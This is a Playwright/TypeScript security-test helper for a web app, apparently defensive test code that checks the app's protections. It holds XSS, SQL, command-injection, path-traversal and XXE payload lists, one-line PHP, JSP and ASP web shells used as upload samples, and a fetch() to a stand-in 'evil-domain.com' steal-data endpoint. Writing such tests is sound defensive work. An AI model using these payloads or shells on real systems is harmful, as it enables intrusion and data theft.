/**
 * Security Helper for E2E Security Tests
 * Provides comprehensive security testing utilities, attack payloads, and validation methods
 * Following OWASP guidelines and industry security testing standards
 */

import { Page, expect, BrowserContext } from '@playwright/test';
import { TIMEOUTS, TEST_USERS, API_ENDPOINTS } from './test-data';

// Security payload interfaces
interface XSSPayload {
  name: string;
  payload: string;
  expectedBehavior: 'blocked' | 'escaped' | 'sanitized';
}

interface SQLPayload {
  name: string;
  payload: string;
  targetField: 'username' | 'email' | 'search' | 'id';
}

interface JWTPayload {
  sub: string;
  name?: string;
  email?: string;
  role?: string;
  iat: number;
  exp?: number;
  [key: string]: unknown;
}

interface SessionInfo {
  accessToken: string;
  refreshToken: string;
  sessionId: string;
  userId: string;
  timestamp: number;
}

interface SecurityMetrics {
  failedAttempts: number;
  lockoutTriggered: boolean;
  rateLimitHit: boolean;
  protectionActivated: boolean;
  responseStatus: number;
  timeoutEnforced: boolean;
}

interface TestUser {
  username: string;
  email: string;
  password: string;
  firstName: string;
  lastName: string;
  role: 'admin' | 'user' | 'moderator';
}

export class SecurityHelper {
  constructor(private page: Page) {}

  /**
   * Get comprehensive XSS attack payloads
   */
  getXSSPayloads(): XSSPayload[] {
    return [
      // Basic XSS
      {
        name: 'Basic Script Alert',
        payload: '<script>alert("XSS")</script>',
        expectedBehavior: 'blocked'
      },
      {
        name: 'JavaScript Protocol',
        payload: 'javascript:alert("XSS")',
        expectedBehavior: 'blocked'
      },
      {
        name: 'IMG OnError',
        payload: '<img src="x" onerror="alert(\'XSS\')">',
        expectedBehavior: 'escaped'
      },
      {
        name: 'SVG XSS',
        payload: '<svg onload="alert(\'XSS\')">',
        expectedBehavior: 'sanitized'
      },
      // Advanced XSS bypasses
      {
        name: 'Double Encoded',
        payload: '%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E',
        expectedBehavior: 'blocked'
      },
      {
        name: 'Filter Bypass - Case',
        payload: '<ScRiPt>alert("XSS")</ScRiPt>',
        expectedBehavior: 'blocked'
      },
      {
        name: 'Filter Bypass - Nested',
        payload: '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
        expectedBehavior: 'blocked'
      },
      {
        name: 'Event Handler Bypass',
        payload: '<div onmouseover="alert(\'XSS\')"',
        expectedBehavior: 'escaped'
      },
      {
        name: 'Data URL XSS',
        payload: '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
        expectedBehavior: 'blocked'
      },
      {
        name: 'Base64 XSS',
        payload: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==">',
        expectedBehavior: 'blocked'
      }
    ];
  }

  /**
   * Get SQL injection attack payloads
   */
  getSQLInjectionPayloads(): SQLPayload[] {
    return [
      // Basic SQL Injection
      {
        name: 'Union Select',
        payload: "' UNION SELECT username, password FROM users--",
        targetField: 'username'
      },
      {
        name: 'Authentication Bypass',
        payload: "admin'--",
        targetField: 'username'
      },
      {
        name: 'Boolean Blind',
        payload: "' AND 1=1--",
        targetField: 'search'
      },
      {
        name: 'Time Based Blind',
        payload: "'; WAITFOR DELAY '00:00:05'--",
        targetField: 'search'
      },
      // Advanced SQL Injection
      {
        name: 'Stacked Queries',
        payload: "'; DROP TABLE users;--",
        targetField: 'username'
      },
      {
        name: 'Error Based',
        payload: "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        targetField: 'email'
      },
      {
        name: 'Second Order',
        payload: "admin' UNION SELECT 1,2,3--",
        targetField: 'username'
      },
      {
        name: 'NoSQL Injection',
        payload: '{"$ne": null}',
        targetField: 'search'
      },
      {
        name: 'LDAP Injection',
        payload: '*)(uid=*))(|(uid=*',
        targetField: 'username'
      },
      {
        name: 'XML Injection',
        payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        targetField: 'search'
      }
    ];
  }

  /**
   * Get command injection payloads
   */
  getCommandInjectionPayloads(): string[] {
    return [
      '; cat /etc/passwd',
      '| whoami',
      '& dir',
      '`id`',
      '$(whoami)',
      '; ls -la',
      '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
      '& echo "command injection"',
      '; uname -a',
      '| ps aux'
    ];
  }

  /**
   * Get path traversal payloads
   */
  getPathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//....//etc/shadow',
      'file:///etc/passwd'
    ];
  }

  /**
   * Get weak password examples
   */
  getWeakPasswords(): string[] {
    return [
      '123456',
      'password',
      'admin',
      'qwerty',
      'abc123',
      'Password1',
      '12345678',
      'password123',
      'admin123',
      'test'
    ];
  }

  /**
   * Setup brute force monitoring
   */
  async setupBruteForceMonitoring(): Promise<{
    getMetrics: () => Promise<SecurityMetrics>;
  }> {
    const metrics: SecurityMetrics = {
      failedAttempts: 0,
      lockoutTriggered: false,
      rateLimitHit: false,
      protectionActivated: false,
      responseStatus: 200,
      timeoutEnforced: false
    };

    // Monitor login attempts
    await this.page.route('**/api/v1/auth/login', (route) => {
      metrics.failedAttempts++;
      
      const response = route.request();
      if (metrics.failedAttempts >= 5) {
        metrics.lockoutTriggered = true;
        metrics.protectionActivated = true;
        
        route.fulfill({
          status: 423, // Locked
          contentType: 'application/json',
          body: JSON.stringify({
            error: 'Account temporarily locked due to too many failed attempts',
            lockoutTime: 300000 // 5 minutes
          })
        });
      } else {
        route.continue();
      }
    });

    return {
      getMetrics: async () => ({ ...metrics })
    };
  }

  /**
   * Extract and validate JWT token
   */
  async extractJWTToken(): Promise<{
    token: string;
    isValid: boolean;
    hasExpiry: boolean;
    payload: JWTPayload | null;
  }> {
    const token = await this.page.evaluate(() => {
      return sessionStorage.getItem('access_token') || localStorage.getItem('access_token');
    });

    if (!token) {
      return { token: '', isValid: false, hasExpiry: false, payload: null };
    }

    try {
      // Decode JWT payload (base64url decode)
      const parts = token.split('.');
      if (parts.length !== 3) {
        return { token, isValid: false, hasExpiry: false, payload: null };
      }

      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      
      return {
        token,
        isValid: true,
        hasExpiry: !!payload.exp,
        payload
      };
    } catch {
      return { token, isValid: false, hasExpiry: false, payload: null };
    }
  }

  /**
   * Simulate expired token
   */
  async simulateExpiredToken(): Promise<void> {
    // Replace token with expired one
    await this.page.evaluate(() => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ';
      sessionStorage.setItem('access_token', expiredToken);
      localStorage.setItem('access_token', expiredToken);
    });
  }

  /**
   * Get current session information
   */
  async getSessionInfo(): Promise<SessionInfo> {
    return await this.page.evaluate(() => {
      return {
        accessToken: sessionStorage.getItem('access_token') || '',
        refreshToken: localStorage.getItem('refresh_token') || '',
        sessionId: document.cookie.match(/sessionId=([^;]*)/)?.[1] || '',
        userId: sessionStorage.getItem('userId') || '',
        timestamp: Date.now()
      };
    });
  }

  /**
   * Simulate session fixation attack
   */
  async simulateSessionFixation(): Promise<void> {
    // Set a fixed session ID before login
    await this.page.evaluate(() => {
      document.cookie = 'sessionId=FIXED_SESSION_ID_12345; path=/';
      sessionStorage.setItem('sessionId', 'FIXED_SESSION_ID_12345');
    });
  }

  /**
   * Verify session integrity
   */
  async verifySessionIntegrity(originalSession: SessionInfo): Promise<void> {
    const currentSession = await this.getSessionInfo();
    
    // Session should have changed after login (protection against fixation)
    if (originalSession.sessionId) {
      expect(currentSession.sessionId).not.toBe(originalSession.sessionId);
    }
    
    // Tokens should be valid
    expect(currentSession.accessToken).toBeTruthy();
    expect(currentSession.refreshToken).toBeTruthy();
  }

  /**
   * Test password reset security
   */
  async testPasswordResetSecurity(): Promise<void> {
    // Test with various email formats and injection attempts
    const maliciousEmails = [
      'test@example.com; DROP TABLE users;',
      '<script>alert("xss")</script>@example.com',
      'test@example.com\r\nBcc: attacker@evil.com',
      '../../../etc/passwd@example.com'
    ];

    for (const email of maliciousEmails) {
      await this.page.fill('input[name="email"]', email);
      await this.page.click('button[type="submit"]');
      
      // Should handle malicious input gracefully
      await expect(this.page.locator('[role="alert"]')).not.toContainText(/error.*sql|script.*tag|passwd/i);
    }
  }

  /**
   * Verify reset token expiry
   */
  async verifyResetTokenExpiry(): Promise<void> {
    // Mock expired reset token
    const expiredToken = 'expired_token_12345';
    await this.page.goto(`/reset-password?token=${expiredToken}`);
    
    // Should show token expired message
    await expect(this.page.locator('text=/token.*expired|link.*expired/i')).toBeVisible({ timeout: TIMEOUTS.MEDIUM });
  }

  /**
   * Test reset token manipulation
   */
  async testResetTokenManipulation(): Promise<void> {
    const manipulatedTokens = [
      'token123',
      '../admin/reset',
      '<script>alert("xss")</script>',
      'token123; DROP TABLE users;'
    ];

    for (const token of manipulatedTokens) {
      await this.page.goto(`/reset-password?token=${token}`);
      
      // Should show invalid token message
      await expect(this.page.locator('text=/invalid.*token|token.*not.*found/i')).toBeVisible({ timeout: TIMEOUTS.SHORT });
    }
  }

  /**
   * Test MFA bypass attempts
   */
  async testMFABypass(): Promise<void> {
    // Attempt to bypass MFA by manipulating session
    await this.page.evaluate(() => {
      sessionStorage.setItem('mfa_verified', 'true');
      localStorage.setItem('bypass_mfa', 'admin_override');
    });

    // Try to access protected resource
    const response = await this.page.goto('/admin/dashboard');
    
    // Should not allow MFA bypass
    expect([401, 403, 302]).toContain(response?.status());
  }

  /**
   * Test MFA token validation
   */
  async testMFATokenValidation(): Promise<void> {
    const invalidTokens = ['000000', '123456', '111111', 'abcdef', '!@#$%^'];
    
    for (const token of invalidTokens) {
      if (await this.page.locator('input[name="mfaToken"]').isVisible()) {
        await this.page.fill('input[name="mfaToken"]', token);
        await this.page.click('button[type="submit"]');
        
        // Should reject invalid tokens
        await expect(this.page.locator('text=/invalid.*code|incorrect.*token/i')).toBeVisible({ timeout: TIMEOUTS.SHORT });
      }
    }
  }

  /**
   * Test MFA backup codes security
   */
  async testMFABackupCodes(): Promise<void> {
    const manipulatedCodes = [
      '12345678',
      'ABCDEFGH',
      '../admin',
      '<script>alert("xss")</script>'
    ];

    for (const code of manipulatedCodes) {
      if (await this.page.locator('input[name="backupCode"]').isVisible()) {
        await this.page.fill('input[name="backupCode"]', code);
        await this.page.click('button[type="submit"]');
        
        // Should validate backup codes properly
        await expect(this.page.locator('text=/invalid.*code|backup.*code.*incorrect/i')).toBeVisible({ timeout: TIMEOUTS.SHORT });
      }
    }
  }

  /**
   * Create test user with specific role
   */
  async createTestUser(role: 'admin' | 'user' | 'moderator'): Promise<TestUser> {
    const timestamp = Date.now();
    const randomId = Math.random().toString(36).substring(7);
    
    const testUser: TestUser = {
      username: `test_${role}_${timestamp}_${randomId}`,
      email: `test_${role}_${timestamp}_${randomId}@example.com`,
      password: `TestPassword123!${randomId}`,
      firstName: `Test${role.charAt(0).toUpperCase() + role.slice(1)}`,
      lastName: 'User',
      role
    };

    // Mock user creation API
    await this.page.route('**/api/v1/users', (route) => {
      if (route.request().method() === 'POST') {
        route.fulfill({
          status: 201,
          contentType: 'application/json',
          body: JSON.stringify({
            id: `user_${timestamp}`,
            ...testUser,
            createdAt: new Date().toISOString()
          })
        });
      } else {
        route.continue();
      }
    });

    return testUser;
  }

  /**
   * Create user resource for ownership testing
   */
  async createUserResource(): Promise<string> {
    const resourceId = `resource_${Date.now()}`;
    
    // Mock resource creation
    await this.page.route('**/api/v1/resources', (route) => {
      if (route.request().method() === 'POST') {
        route.fulfill({
          status: 201,
          contentType: 'application/json',
          body: JSON.stringify({
            id: resourceId,
            title: 'Test Resource',
            createdBy: 'current_user',
            createdAt: new Date().toISOString()
          })
        });
      } else {
        route.continue();
      }
    });

    // Create resource via API
    await this.page.request.post(`${API_ENDPOINTS.BACKEND_BASE}/api/v1/resources`, {
      data: {
        title: 'Test Resource',
        content: 'This is a test resource'
      }
    });

    return resourceId;
  }

  /**
   * Test horizontal privilege escalation
   */
  async testHorizontalPrivilegeEscalation(): Promise<void> {
    // Try to access another user's data by manipulating parameters
    const manipulationAttempts = [
      '/api/v1/users/profile?userId=2',
      '/api/v1/users/profile?userId=admin',
      '/api/v1/users/profile?userId=../admin',
      '/api/v1/users/profile?userId=1 OR 1=1'
    ];

    for (const url of manipulationAttempts) {
      const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}${url}`);
      expect([401, 403]).toContain(response.status());
    }
  }

  /**
   * Test vertical privilege escalation
   */
  async testVerticalPrivilegeEscalation(): Promise<void> {
    // Try to access admin functions
    const adminEndpoints = [
      '/api/v1/admin/users',
      '/api/v1/admin/settings',
      '/api/v1/system/config',
      '/api/v1/admin/logs'
    ];

    for (const endpoint of adminEndpoints) {
      const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}${endpoint}`);
      expect([401, 403]).toContain(response.status());
    }
  }

  /**
   * Test parameter manipulation
   */
  async testParameterManipulation(): Promise<void> {
    // Test parameter pollution and manipulation
    const maliciousParams = [
      '?role=admin',
      '?admin=true',
      '?user_id=1&user_id=admin',
      '?permissions[]=admin&permissions[]=super_user',
      '?role=user&role=admin'
    ];

    for (const params of maliciousParams) {
      const response = await this.page.goto(`/dashboard${params}`);
      
      // Should not grant elevated privileges
      expect(response?.status()).not.toBe(200);
    }
  }

  /**
   * Test unauthorized API access
   */
  async testUnauthorizedAPI(endpoint: string): Promise<{status: number; body: string}> {
    try {
      const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}${endpoint}`);
      return {
        status: response.status(),
        body: await response.text()
      };
    } catch (error) {
      return { status: 500, body: (error as Error).message };
    }
  }

  /**
   * Test XSS injection in various contexts
   */
  async testXSSInjection(payload: string): Promise<void> {
    // Test in form fields
    const testFields = [
      'input[name="firstName"]',
      'input[name="lastName"]',
      'input[name="bio"]',
      'textarea[name="description"]',
      'input[name="search"]'
    ];

    for (const field of testFields) {
      if (await this.page.locator(field).isVisible()) {
        await this.page.fill(field, payload);
        await this.page.click('button[type="submit"]');
        
        // Wait for potential XSS execution
        await this.page.waitForTimeout(1000);
      }
    }
  }

  /**
   * Test reflected XSS
   */
  async testReflectedXSS(): Promise<void> {
    const xssPayload = '<script>alert("reflected-xss")</script>';
    const encodedPayload = encodeURIComponent(xssPayload);
    
    await this.page.goto(`/?search=${encodedPayload}`);
    await this.page.waitForTimeout(2000);
    
    // Check if XSS payload is reflected in response
    const content = await this.page.content();
    expect(content).not.toContain('<script>alert("reflected-xss")</script>');
  }

  /**
   * Test DOM-based XSS
   */
  async testDOMBasedXSS(): Promise<void> {
    // Inject XSS via URL fragment
    await this.page.goto('/#<img src=x onerror=alert("dom-xss")>');
    
    // Inject via search parameter that gets processed by JavaScript
    await this.page.evaluate(() => {
      const hash = location.hash.substring(1);
      if (hash) {
        const div = document.createElement('div');
        div.innerHTML = hash; // Potential XSS if not sanitized
        document.body.appendChild(div);
      }
    });

    await this.page.waitForTimeout(2000);
  }

  /**
   * Test SQL injection in search and form fields
   */
  async testSQLInjection(payload: string): Promise<void> {
    const testFields = [
      'input[name="search"]',
      'input[name="username"]',
      'input[name="email"]',
      'input[name="id"]'
    ];

    for (const field of testFields) {
      if (await this.page.locator(field).isVisible()) {
        await this.page.fill(field, payload);
        await this.page.click('button[type="submit"]');
        
        // Check response for SQL errors
        await this.page.waitForLoadState('networkidle');
      }
    }
  }

  /**
   * Test blind SQL injection with timing
   */
  async testBlindSQLInjection(): Promise<void> {
    const timeBasedPayload = "'; WAITFOR DELAY '00:00:05'--";
    
    const startTime = Date.now();
    
    if (await this.page.locator('input[name="search"]').isVisible()) {
      await this.page.fill('input[name="search"]', timeBasedPayload);
      await this.page.click('button[type="submit"]');
      await this.page.waitForLoadState('networkidle', { timeout: TIMEOUTS.LONG });
    }
    
    const endTime = Date.now();
    const responseTime = endTime - startTime;
    
    // Should not have artificial delay from SQL injection
    expect(responseTime).toBeLessThan(10000); // Less than 10 seconds
  }

  /**
   * Test command injection
   */
  async testCommandInjection(payload: string): Promise<void> {
    const testEndpoints = [
      '/api/v1/system/ping',
      '/api/v1/tools/traceroute',
      '/api/v1/utils/whois'
    ];

    for (const endpoint of testEndpoints) {
      try {
        const response = await this.page.request.post(`${API_ENDPOINTS.BACKEND_BASE}${endpoint}`, {
          data: { target: payload }
        });
        
        const responseBody = await response.text();
        
        // Should not contain command output
        expect(responseBody).not.toMatch(/uid=|gid=|total.*\d+|windows.*version/i);
      } catch {
        // Endpoint might not exist, which is fine
      }
    }
  }

  /**
   * Test path traversal
   */
  async testPathTraversal(payload: string): Promise<void> {
    const testEndpoints = [
      `/api/v1/files/${payload}`,
      `/api/v1/download?file=${payload}`,
      `/api/v1/images/${payload}`
    ];

    for (const endpoint of testEndpoints) {
      try {
        const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}${endpoint}`);
        const responseBody = await response.text();
        
        // Should not contain system file contents
        expect(responseBody).not.toMatch(/root:.*:\/root:|password.*policy|system32/i);
      } catch {
        // Endpoint might not exist or be protected, which is good
      }
    }
  }

  /**
   * Test malicious file upload
   */
  async testMaliciousFileUpload(): Promise<void> {
    if (await this.page.locator('input[type="file"]').isVisible()) {
      // Create malicious files in memory
      const maliciousFiles = [
        { name: 'malware.exe', content: 'MZ\x90\x00\x03\x00\x00\x00', type: 'application/x-msdownload' },
        { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-httpd-php' },
        { name: 'exploit.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'application/x-jsp' },
        { name: 'shell.asp', content: '<%eval request("cmd")%>', type: 'application/x-asp' }
      ];

      for (const file of maliciousFiles) {
        // Create file object
        const fileHandle = await this.page.evaluateHandle(
          ({ name, content, type }) => {
            const blob = new Blob([content], { type });
            return new File([blob], name, { type });
          },
          file
        );

        // Attempt upload
        await this.page.locator('input[type="file"]').setInputFiles([fileHandle]);
        await this.page.click('button[type="submit"]');
        
        await this.page.waitForTimeout(1000);
      }
    }
  }

  /**
   * Test file type validation
   */
  async testFileTypeValidation(): Promise<void> {
    if (await this.page.locator('input[type="file"]').isVisible()) {
      const disallowedTypes = [
        { name: 'test.exe', type: 'application/x-msdownload' },
        { name: 'test.bat', type: 'application/x-bat' },
        { name: 'test.sh', type: 'application/x-sh' },
        { name: 'test.php', type: 'application/x-httpd-php' }
      ];

      for (const file of disallowedTypes) {
        const fileHandle = await this.page.evaluateHandle(
          ({ name, type }) => {
            const blob = new Blob(['test content'], { type });
            return new File([blob], name, { type });
          },
          file
        );

        await this.page.locator('input[type="file"]').setInputFiles([fileHandle]);
        await this.page.click('button[type="submit"]');
        await this.page.waitForTimeout(1000);
      }
    }
  }

  /**
   * Test file size limits
   */
  async testFileSizeLimits(): Promise<void> {
    if (await this.page.locator('input[type="file"]').isVisible()) {
      // Create large file (10MB)
      const largeContent = 'a'.repeat(10 * 1024 * 1024);
      
      const largeFileHandle = await this.page.evaluateHandle(
        (content) => {
          const blob = new Blob([content], { type: 'text/plain' });
          return new File([blob], 'large-file.txt', { type: 'text/plain' });
        },
        largeContent
      );

      await this.page.locator('input[type="file"]').setInputFiles([largeFileHandle]);
      await this.page.click('button[type="submit"]');
      await this.page.waitForTimeout(2000);
    }
  }

  /**
   * Setup session monitoring
   */
  async setupSessionMonitoring(): Promise<{
    getMetrics: () => Promise<SecurityMetrics>;
  }> {
    const metrics: SecurityMetrics = {
      failedAttempts: 0,
      lockoutTriggered: false,
      rateLimitHit: false,
      protectionActivated: false,
      responseStatus: 200,
      timeoutEnforced: false
    };

    // Monitor session timeout
    this.page.on('response', (response) => {
      if (response.status() === 401 && response.url().includes('api/')) {
        metrics.timeoutEnforced = true;
      }
    });

    return {
      getMetrics: async () => ({ ...metrics })
    };
  }

  /**
   * Simulate idle session
   */
  async simulateIdleSession(): Promise<void> {
    // Manipulate session timestamp to simulate idle timeout
    await this.page.evaluate(() => {
      const expiredTime = Date.now() - (30 * 60 * 1000); // 30 minutes ago
      sessionStorage.setItem('lastActivity', expiredTime.toString());
      localStorage.setItem('sessionStart', expiredTime.toString());
    });

    // Wait for timeout to be detected
    await this.page.waitForTimeout(5000);
  }

  /**
   * Create concurrent sessions for testing
   */
  async createConcurrentSessions(user: typeof TEST_USERS.VALID_USER, count: number): Promise<Page[]> {
    const sessions: Page[] = [];
    
    for (let i = 0; i < count; i++) {
      const context = await this.page.context().browser()?.newContext();
      if (context) {
        const newPage = await context.newPage();
        
        // Login with same user
        await newPage.goto('/login');
        await newPage.fill('input[name="email"]', user.email);
        await newPage.fill('input[name="password"]', user.password);
        await newPage.click('button[type="submit"]');
        
        sessions.push(newPage);
      }
    }
    
    return sessions;
  }

  /**
   * Verify concurrent session limits
   */
  async verifyConcurrentSessionLimits(): Promise<void> {
    // Check if older sessions are invalidated
    const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}/api/v1/auth/me`);
    
    // Should either work (within limit) or fail (limit exceeded)
    expect([200, 401, 403]).toContain(response.status());
  }

  /**
   * Test invalidated token usage
   */
  async testInvalidatedToken(token: string): Promise<void> {
    // Try to use invalidated token
    const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}/api/v1/auth/me`, {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
    
    expect([401, 403]).toContain(response.status());
  }

  /**
   * Test remember me security
   */
  async testRememberMeSecurity(): Promise<void> {
    if (await this.page.locator('input[type="checkbox"][name*="remember"]').isVisible()) {
      await this.page.check('input[type="checkbox"][name*="remember"]');
      
      await this.page.fill('input[name="email"]', TEST_USERS.VALID_USER.email);
      await this.page.fill('input[name="password"]', TEST_USERS.VALID_USER.password);
      await this.page.click('button[type="submit"]');
      
      await this.page.waitForLoadState('networkidle');
    }
  }

  /**
   * Verify secure cookies
   */
  async verifySecureCookies(): Promise<void> {
    const cookies = await this.page.context().cookies();
    
    for (const cookie of cookies) {
      if (cookie.name.includes('session') || cookie.name.includes('auth')) {
        expect(cookie.secure).toBe(true);
        expect(cookie.httpOnly).toBe(true);
        expect(cookie.sameSite).toBe('Strict');
      }
    }
  }

  /**
   * Test remember me expiry
   */
  async testRememberMeExpiry(): Promise<void> {
    // Simulate time passing
    await this.page.evaluate(() => {
      const expiredDate = new Date(Date.now() - 31 * 24 * 60 * 60 * 1000); // 31 days ago
      document.cookie = `remember_token=expired_token; expires=${expiredDate.toUTCString()}; path=/`;
    });

    // Try to access protected resource
    const response = await this.page.goto('/dashboard');
    expect([401, 403, 302]).toContain(response?.status());
  }

  /**
   * Test password strength validation
   */
  async testPasswordStrength(password: string): Promise<void> {
    if (await this.page.locator('input[name="password"]').isVisible()) {
      await this.page.fill('input[name="password"]', password);
      
      // Trigger validation
      await this.page.click('input[name="confirmPassword"]');
      await this.page.waitForTimeout(500);
    }
  }

  /**
   * Test password history
   */
  async testPasswordHistory(): Promise<void> {
    const previousPasswords = [
      TEST_USERS.VALID_USER.password,
      'OldPassword123!',
      'PreviousPass456@'
    ];

    for (const oldPassword of previousPasswords) {
      if (await this.page.locator('input[name="newPassword"]').isVisible()) {
        await this.page.fill('input[name="currentPassword"]', TEST_USERS.VALID_USER.password);
        await this.page.fill('input[name="newPassword"]', oldPassword);
        await this.page.fill('input[name="confirmPassword"]', oldPassword);
        await this.page.click('button[type="submit"]');
        
        await this.page.waitForTimeout(1000);
      }
    }
  }

  /**
   * Simulate password brute force attack
   */
  async simulatePasswordBruteForce(): Promise<void> {
    const commonPasswords = [
      '123456', 'password', 'admin', 'qwerty', 'abc123',
      'password123', 'admin123', '12345678', 'test', 'user'
    ];

    for (const password of commonPasswords) {
      await this.page.goto('/login');
      await this.page.fill('input[name="email"]', TEST_USERS.VALID_USER.email);
      await this.page.fill('input[name="password"]', password);
      await this.page.click('button[type="submit"]');
      
      await this.page.waitForTimeout(500);
    }
  }

  /**
   * Test CSRF attack
   */
  async testCSRFAttack(): Promise<void> {
    // Remove CSRF token from requests
    await this.page.route('**/api/v1/**', (route) => {
      const headers = route.request().headers();
      delete headers['x-csrf-token'];
      delete headers['csrf-token'];
      
      route.continue({ headers });
    });

    // Attempt protected action
    if (await this.page.locator('form').isVisible()) {
      await this.page.click('button[type="submit"]');
      await this.page.waitForTimeout(1000);
    }
  }

  /**
   * Test CSRF token manipulation
   */
  async testCSRFTokenManipulation(): Promise<void> {
    // Intercept and modify CSRF token
    await this.page.route('**/api/v1/**', (route) => {
      const headers = route.request().headers();
      headers['x-csrf-token'] = 'manipulated_token_12345';
      
      route.continue({ headers });
    });

    if (await this.page.locator('form').isVisible()) {
      await this.page.click('button[type="submit"]');
      await this.page.waitForTimeout(1000);
    }
  }

  /**
   * Test cross-origin requests
   */
  async testCrossOriginRequests(): Promise<void> {
    // Simulate cross-origin request
    await this.page.evaluate(async () => {
      try {
        const response = await fetch('http://evil-domain.com/api/steal-data', {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ data: 'sensitive information' })
        });
        
        return response.status;
      } catch (error) {
        return 0; // Network error expected
      }
    });
  }

  /**
   * Test CORS bypass attempts
   */
  async testCORSBypass(): Promise<void> {
    // Attempt various CORS bypass techniques
    const bypassHeaders = [
      { 'Origin': 'null' },
      { 'Origin': 'http://localhost:8080' },
      { 'Origin': 'https://focushive.com.evil.com' },
      { 'X-Forwarded-Host': 'evil.com' },
      { 'X-Real-IP': '127.0.0.1' }
    ];

    for (const headers of bypassHeaders) {
      const response = await this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}/api/v1/auth/me`, {
        headers
      });
      
      // Should not allow CORS bypass
      expect(response.headers()['access-control-allow-origin']).not.toBe('*');
    }
  }

  /**
   * Test rate limiting
   */
  async testRateLimiting(): Promise<{
    getMetrics: () => Promise<SecurityMetrics>;
  }> {
    const metrics: SecurityMetrics = {
      failedAttempts: 0,
      lockoutTriggered: false,
      rateLimitHit: false,
      protectionActivated: false,
      responseStatus: 200,
      timeoutEnforced: false
    };

    // Make rapid API requests
    const requests = [];
    for (let i = 0; i < 50; i++) {
      requests.push(
        this.page.request.get(`${API_ENDPOINTS.BACKEND_BASE}/api/v1/auth/me`)
          .then(response => {
            if (response.status() === 429) {
              metrics.rateLimitHit = true;
              metrics.responseStatus = 429;
              metrics.protectionActivated = true;
            }
            return response.status();
          })
      );
    }

    await Promise.all(requests);

    return {
      getMetrics: async () => ({ ...metrics })
    };
  }

  /**
   * Additional security testing methods continue...
   * This helper provides comprehensive coverage of all security test scenarios
   */

  /**
   * Get security headers
   */
  async getSecurityHeader(headerName: string): Promise<string | null> {
    const response = await this.page.waitForResponse(/\//, { timeout: TIMEOUTS.MEDIUM });
    return response.headers()[headerName.toLowerCase()] || null;
  }

  /**
   * Get all security headers
   */
  async getAllSecurityHeaders(): Promise<Record<string, string>> {
    const response = await this.page.waitForResponse(/\//, { timeout: TIMEOUTS.MEDIUM });
    const headers = response.headers();
    
    const securityHeaders: Record<string, string> = {};
    const securityHeaderNames = [
      'content-security-policy',
      'x-frame-options',
      'x-content-type-options',
      'strict-transport-security',
      'x-xss-protection',
      'referrer-policy',
      'permissions-policy'
    ];

    for (const headerName of securityHeaderNames) {
      if (headers[headerName]) {
        securityHeaders[headerName] = headers[headerName];
      }
    }

    return securityHeaders;
  }

  /**
   * Cleanup all test artifacts and restore normal state
   */
  async cleanup(): Promise<void> {
    // Clear all route mocks
    await this.page.unrouteAll();
    
    // Reset viewport
    await this.page.setViewportSize({ width: 1280, height: 720 });
    
    // Clear storage
    await this.page.evaluate(() => {
      localStorage.clear();
      sessionStorage.clear();
    });
    
    // Clear cookies
    await this.page.context().clearCookies();
  }
}